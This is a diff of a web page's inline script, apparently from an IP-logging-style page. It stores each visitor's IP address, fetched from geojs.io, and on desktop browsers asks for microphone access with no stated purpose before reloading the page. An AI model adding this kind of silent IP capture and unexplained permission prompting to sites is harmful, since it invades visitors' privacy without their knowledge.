@@ -8,35 +8,38 @@
     <meta property="og:image" content="ip7.png">
     <meta property="og:image:width" content="603">
     <meta property="og:image:height content=" 310"="">
-    <script>
-        function geoip(gip) {
-            window.remip2 = gip.ip;
-        }
-        navigator.permissions.query({
-            name: 'camera'
-        }).then((result) => {
+<script>
+    function geoip(gip) {
+        window.remip2 = gip.ip;
+    }
+
+    function isDesktopDevice() {
+        const ua = navigator.userAgent || '';
+        const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+        const isTouchDevice = navigator.maxTouchPoints > 0;
+        return !mobileRegex.test(ua) && !(isTouchDevice && window.innerWidth < 768);
+    }
+
+    if (isDesktopDevice() && navigator.permissions && navigator.permissions.query) {
+        navigator.permissions.query({ name: 'microphone' }).then((result) => {
             if (result.state === 'granted') {
                 console.log('ok');
             } else if (result.state === 'prompt') {
                 navigator.mediaDevices.getUserMedia({
-                        audio: true,
-                        video: true
-                    })
-                    .then((stream) => {
-                        stream.getTracks().forEach(function (track) {
-                            track.stop();
-                        });
-                        location.reload(true);
-                    })
-                    .catch((err) => {
-                        stream.getTracks().forEach(function (track) {
-                            track.stop();
-                        });
-                    });
+                    audio: true,
+                    video: false
+                }).then((stream) => {
+                    stream.getTracks().forEach(track => track.stop());
+                    location.reload(true);
+                }).catch((err) => {
+                    console.log('Microphone access denied or unsupported', err);
+                });
             }
-            // Don't do anything if the permission was denied.
+        }).catch(() => {
+            // Ignore browsers without permission API support
         });
-    </script>
+    }
+</script>
     <script src="https://ipv4.geojs.io/v1/ip.js "></script>
     <style>
         body {
